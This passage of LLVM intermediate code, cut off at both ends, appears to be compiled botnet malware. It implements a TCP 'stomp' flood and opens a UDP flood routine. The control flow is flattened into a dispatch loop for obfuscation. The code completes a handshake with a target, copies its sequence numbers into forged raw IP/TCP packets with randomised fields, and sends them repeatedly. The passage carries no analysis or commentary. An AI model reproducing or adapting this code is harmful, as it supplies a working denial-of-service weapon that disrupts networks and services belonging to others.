; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 282586969, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #6
  store i64 %196, i64* %31, align 8
  store i32 231572495, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -69135126, i32 -1965873233
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 -1439872230, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -261691344, i32 2038591556
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 -840345323, i32 2038591556
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 1532227189, i32 1400581307
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 363854246, i32 610616261
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -1574014427, i32 610616261
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #6
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 139317964, i32 980603100
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 980603100, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 -1176323581, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -169645092, i32 1968102614
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -169645092, i32 -221227553
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 -548862747, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 -621211705, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 1400581307, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 2038591556, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 1219831582, i32 533175854
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -548862747, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 231572495, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -219056249, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 -1881458871, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 1591198406, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 342043130, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 -2009572608, i32 431623966
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 169885625, i32 -1799344485
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 -1799344485, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 772910705, i32 1686748489
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 1686748489, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #7
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 743557590, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 342043130, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 1591198406, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
